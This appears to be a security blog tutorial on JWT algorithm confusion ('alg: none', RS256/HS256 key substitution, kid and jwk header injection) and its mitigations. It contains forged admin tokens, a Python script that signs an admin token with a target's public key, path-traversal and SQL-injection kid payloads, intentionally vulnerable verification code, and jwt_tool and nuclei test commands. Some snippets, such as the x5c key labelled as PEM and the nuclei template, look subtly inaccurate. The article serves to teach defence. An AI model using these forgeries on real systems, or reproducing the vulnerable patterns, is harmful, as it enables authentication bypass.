---
title: "JWT Algorithm Confusion: How 'alg: none' and RS256/HS256 Attacks Bypass Authentication"
description: "Deep dive into JWT header algorithm bypasses including the 'none' algorithm attack, RS256 to HS256 downgrade, and key confusion vulnerabilities that compromise token security."
category: "security"
date: "2026-03-16"
---

# JWT Algorithm Confusion: How 'alg: none' and RS256/HS256 Attacks Bypass Authentication

JSON Web Tokens (JWTs) have become the de facto standard for stateless authentication in modern web applications. Yet a critical implementation detail in the JWT specification—specifically, the `alg` header parameter—has introduced an entire class of authentication bypass vulnerabilities that continue to plague production systems today.

## The Root Cause: Trusting Client-Specified Algorithms

The JWT specification ([RFC 7519](https://tools.ietf.org/html/rfc7519)) defines the `alg` header as indicating the cryptographic algorithm used to secure the token. The fundamental vulnerability lies in this simple fact: **the algorithm is specified by the token itself**.

When a server receives a JWT, it typically does something like:

```javascript
const decoded = jwt.verify(token, secretOrKey);
```

But here's the problem: most JWT libraries default to extracting the `alg` from the header and using whatever the client specifies. This creates a trust boundary violation where attackers can manipulate the algorithm to bypass verification entirely.

## Attack Vector 1: The "none" Algorithm

The most egregious vulnerability involves the `alg: "none"` algorithm, explicitly defined in the JWT specification for "unsecured JWTs." While intended for specific use cases where integrity is not required, its mere existence creates an attack surface.

### How the Attack Works

1. Attacker intercepts a valid JWT (or crafts one)
2. Modifies the header to specify `"alg": "none"`
3. Removes the signature portion (or leaves it empty)
4. Modifies the payload to escalate privileges (e.g., changing `"role": "user"` to `"role": "admin"`)
5. Server receives the token, sees `alg: none`, and skips signature verification
6. Application trusts the modified payload

### Example Payload

**Original Token:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.signature
```

**Modified Malicious Token:**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
```

Base64-decoded header: `{"alg":"none","typ":"JWT"}`
Base64-decoded payload: `{"user":"admin","role":"admin"}`

Notice the trailing dot—the signature is empty, but the server accepts it because `alg: none` instructs verification to be skipped.

### Vulnerable Code Pattern

```javascript
// VULNERABLE: trusts alg from header
const jwt = require('jsonwebtoken');
app.get('/admin', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  const decoded = jwt.verify(token, process.env.JWT_SECRET); // Dangerous!
  if (decoded.role === 'admin') {
    // Admin functionality
  }
});
```

### The Fix

```javascript
// SECURE: explicitly specify allowed algorithms
const decoded = jwt.verify(token, process.env.JWT_SECRET, {
  algorithms: ['HS256'] // Whitelist only expected algorithms
});
```

Modern versions of the `jsonwebtoken` library (v9.0.0+) now reject `alg: none` by default, but explicit algorithm whitelisting remains essential defense in depth.

## Attack Vector 2: RS256 to HS256 Algorithm Substitution

Asymmetric algorithms like RS256 (RSA with SHA-256) use public/private key pairs—the server signs with a private key and verifies with a public key. Symmetric algorithms like HS256 (HMAC with SHA-256) use a single shared secret for both signing and verification.

The critical vulnerability emerges when servers support both algorithm types but use the same key material.

### The Attack Mechanics

1. Application uses RS256 with a private key for signing and publishes the public key at `/jwks.json`
2. Attacker extracts the public key (which is, by design, public)
3. Attacker modifies the JWT header to use `alg: HS256` instead of `alg: RS256`
4. Attacker signs the token using the public key as the HMAC secret
5. Server receives token, sees `alg: HS256`, and verifies using the same public key as the secret
6. Verification succeeds because `HMAC-SHA256(token, public_key)` matches the signature

### Why This Works

Most JWT libraries implement verification pseudocode like:

```javascript
function verify(token, key) {
  const header = JSON.parse(base64Decode(token.header));
  
  if (header.alg === 'RS256') {
    return rsaVerify(token.signature, token.payload, key);
  } else if (header.alg === 'HS256') {
    const expectedSig = hmacSha256(token.header + '.' + token.payload, key);
    return timingSafeEqual(token.signature, expectedSig);
  }
  // ... other algorithms
}
```

When the attacker switches to HS256, the `key` parameter—which was intended as an RSA public key—gets passed to `hmacSha256()`. In many implementations, the key object gets stringified or the raw key material is used, allowing the attack to succeed.

### Extracting and Using the Public Key

```python
import jwt
import requests

# Step 1: Get the public key from JWKS endpoint
jwks = requests.get('https://target.com/.well-known/jwks.json').json()
public_key_pem = jwks['keys'][0]['x5c'][0]  # Extract certificate

# Step 2: Craft malicious token using public key as HMAC secret
token = jwt.encode(
    {'sub': 'admin', 'role': 'admin'},
    key=public_key_pem,  # Using public key as symmetric secret!
    algorithm='HS256',
    headers={'kid': jwks['keys'][0]['kid']}
)

print(token)
```

### Real-World Impact

This vulnerability has affected numerous high-profile systems:
- **Auth0** (2016): Improper algorithm validation allowed privilege escalation
- **Firebase** (2017): Similar RS256/HS256 confusion in custom token validation
- **Multiple OAuth providers**: JWK endpoint exposure combined with algorithm confusion

## Attack Vector 3: Key ID (kid) Header Injection

The `kid` (Key ID) header parameter specifies which key was used to sign the token. When combined with algorithm confusion, attackers can manipulate key resolution logic.

### Directory Traversal via kid

Some implementations resolve keys using the `kid` directly in file paths:

```javascript
// VULNERABLE: kid used in filesystem path
const key = fs.readFileSync(`./keys/${header.kid}.pem`);
```

Attacker sets: `{"kid": "../../../etc/passwd", "alg": "HS256"}`

Result: Application reads arbitrary file as HMAC key, potentially using predictable content to forge valid signatures.

### SQL Injection via kid

If key resolution queries a database:

```javascript
const key = db.query(`SELECT key FROM jwt_keys WHERE id = '${header.kid}'`);
```

Attacker sets: `{"kid": "' UNION SELECT 'known_secret' --", "alg": "HS256"}`

### JWK Embedded Key Injection

The `jwk` (JSON Web Key) header allows embedding the verification key directly in the token:

```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "attacker-controlled-public-key",
    "e": "AQAB"
  }
}
```

If the server trusts embedded JWKs without validation, attackers can sign tokens with their own key pair and embed the public key for verification.

## Comprehensive Mitigation Strategies

### 1. Explicit Algorithm Whitelisting

**Always** specify allowed algorithms explicitly:

```javascript
// Node.js (jsonwebtoken)
jwt.verify(token, secret, { algorithms: ['HS256'] });

// Python (PyJWT)
jwt.decode(token, secret, algorithms=['HS256'])

// Go (golang-jwt)
token, err := jwt.Parse(token, func(t *jwt.Token) (interface{}, error) {
    if t.Method.Alg() != "HS256" {
        return nil, fmt.Errorf("unexpected signing method: %v", t.Method.Alg())
    }
    return secret, nil
})
```

### 2. Separate Key Stores for Asymmetric/Symmetric

Never use the same key material for different algorithm types:

```javascript
// SECURE: different secrets for different algorithms
const verifyToken = (token) => {
  const header = JSON.parse(base64UrlDecode(token.split('.')[0]));
  
  if (header.alg === 'RS256') {
    return jwt.verify(token, rsaPublicKey, { algorithms: ['RS256'] });
  } else if (header.alg === 'HS256') {
    return jwt.verify(token, hmacSecret, { algorithms: ['HS256'] });
  }
  throw new Error('Unsupported algorithm');
};
```

### 3. Reject Tokens with Suspicious Headers

```javascript
const FORBIDDEN_HEADERS = ['jwk', 'jku', 'x5c', 'x5u'];

const sanitizeHeader = (header) => {
  FORBIDDEN_HEADERS.forEach(h => {
    if (h in header) {
      throw new Error(`Forbidden header parameter: ${h}`);
    }
  });
};
```

### 4. Use Strongly-Typed JWT Libraries

Prefer libraries that separate asymmetric and symmetric verification paths:

```javascript
// jose library (recommended) - enforces algorithm/key type matching
import { jwtVerify } from 'jose';

// RS256 requires a CryptoKey (asymmetric)
const { payload } = await jwtVerify(token, publicKey, {
  algorithms: ['RS256']
});
```

### 5. Key Rotation and kid Validation

Maintain a strict allowlist of valid `kid` values:

```javascript
const VALID_KIDS = ['key-2024-01', 'key-2024-02'];

const getKey = (header) => {
  if (!VALID_KIDS.includes(header.kid)) {
    throw new Error('Invalid key ID');
  }
  return keyStore[header.kid];
};
```

## Testing for Algorithm Confusion Vulnerabilities

### Manual Testing with jwt_tool

```bash
# Install jwt_tool
pip install jwt-tool

# Test for alg:none
jwt_tool.py target_token.txt -at -pc "role" -pv "admin"

# Test RS256->HS256 confusion
jwt_tool.py target_token.txt -X k -pk public_key.pem
```

### Burp Suite JWT Editor Extension

1. Intercept JWT in Burp Proxy
2. Send to JWT Editor
3. Modify `alg` header parameter
4. Re-sign with appropriate key (or none)
5. Forward request and observe response

### Automated Scanning with nuclei

```yaml
# jwt-alg-none.yaml template
id: jwt-alg-none

info:
  name: JWT Algorithm None Bypass
  severity: critical

requests:
  - raw:
      - |
        GET /api/admin HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{base64("{\"alg\":\"none\",\"typ\":\"JWT\"}")}.{{base64("{\"role\":\"admin\"}")}}.
    matchers:
      - type: status
        status:
          - 200
```

## Conclusion

JWT algorithm confusion vulnerabilities represent a critical class of authentication bypass that stems from violating a fundamental security principle: **never trust client-supplied cryptographic parameters**. The `alg` header, while convenient for algorithm agility, creates an unacceptable attack surface when not strictly validated.

The defense is straightforward but requires discipline:
1. Whitelist expected algorithms explicitly
2. Never accept `alg: none` in production contexts
3. Isolate key materials between asymmetric and symmetric algorithms
4. Reject embedded keys and unvalidated `kid` parameters
5. Use modern, strongly-typed JWT libraries that prevent algorithm/key mismatches

Organizations still running legacy JWT implementations should audit their verification logic immediately—these vulnerabilities are well-understood by attackers and frequently exploited in the wild.

## References

- [RFC 7519 - JSON Web Token (JWT)](https://tools.ietf.org/html/rfc7519)
- [RFC 7515 - JSON Web Signature (JWS)](https://tools.ietf.org/html/rfc7515)
- [CWE-327: Use of Broken or Risky Cryptographic Algorithm](https://cwe.mitre.org/data/definitions/327.html)
- [Auth0: Critical Vulnerability in JSON Web Token Libraries](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
